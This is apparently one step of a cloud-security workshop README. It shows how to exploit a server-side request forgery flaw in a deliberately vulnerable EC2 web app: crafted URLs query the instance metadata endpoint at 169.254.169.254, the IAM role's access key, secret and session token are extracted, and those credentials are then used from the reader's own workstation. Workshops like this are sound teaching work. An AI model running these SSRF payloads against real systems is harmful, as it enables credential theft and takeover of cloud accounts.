## Step 2 - Exploiting the vulnerability

#### 1.  From the console, locate the ec2 instance that was provisioned. 

You can do so by visiting [EC2 console, and filtering for instance named "vulnerable instance"](https://console.aws.amazon.com/ec2/v2/home?#Instances:tag:Name=vulnerable-instance)


You can find the public IP by clicking on the instance, and going to `Details`, then `Public IPv4 address`.

Alternatively, you can search for your instance public IP address via CLI using following command

```shell 
 aws ec2 describe-instances \
    --filter "Name=tag:aws:cloudformation:logical-id,Values=vulnWebServer" \
    --query 'Reservations[0].Instances[0].PublicIpAddress'
```


#### 2.  Visit web application

In a seperate browser window, navigate to the public IP address of the ec2 instance.

**Make sure that you change the url to use http, as that is how we have configured our security group.**


```script 
 http://<public_ipv4_address>/
```

We can see that the web server is running, but it looks like it's expecting a query string.  We need to construct an SSRF payload.


<br />
<br />

#### 3.  Explore metadata vulnerability

First, let's look at some of the metadata categories available:

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/
```

These are all categories of information that the ec2 instance would be able to access during it's day to day actions.


<br />
<br />

#### 4.  Extract AWS credentials

By navigating through the API structure, we can eventually get to credentials.  Paste each url into your browser to work through the API directory structure.   


**Variables Required**


{Instance-Profile} - The instance profile name will be unique to each environment.  This will be the value listed under `security-credentials` - 2nd url below

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/

 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
 
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{Instance-Profile}
```

<br />
<br />

#### 5. Extract the VM AWS credentials 

These are the credentials of the instance profile that is being used by the ec2 instance. By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  

Copy the value of `AccessKeyId`, `SecretAccessKey` and `Token`, and use it to configure a profile called `ssrf-demo`.  
<br />

In order to do this, open your aws credential file in a text editor.  By default, credential files are stored in the following places:   
    - Windows: `C:\Users\username\.aws\credentials`  
    - Linux: `~/.aws/credentials`

Create a new entry called `ssrf-demo`.  

<b> Variables Required </b>  
- {AccessKeyId} - The Access key as found in the browser window.
- {SecretAccessKey} - The Secret Access key, as shown in the browser
- {Token} - The Token value, as shown in the browser. Please note that if you can't copy the 
  whole token, you may need to view page source in your browser, to copy the whole session token

<br />
<br />
```script
    [ssrf-demo]
    aws_access_key_id = ${AccessKeyId}
    aws_secret_access_key = ${SecretAccessKey}
    aws_session_token = ${Token}
```

At this point, you should be able to query caller identity API 
from your workstation

```shell
aws sts get-caller-identity --profile ssrf-demo
```

Given that your configuration was correct, you should see output like one below

```
{
    "UserId": "AROAYQJWPZVIG34M32UA7:i-0dd5d5c17f9175875",
    "Account": "584766704976",
    "Arn": "arn:aws:sts::123456789012:assumed-role/ec2-metadata-ssrf-webServerRole-10DJ6YCJ8YZIK/i-0dd5d5c17f9175875"
}
```

You can now move to [step 3](../step3/README.md)
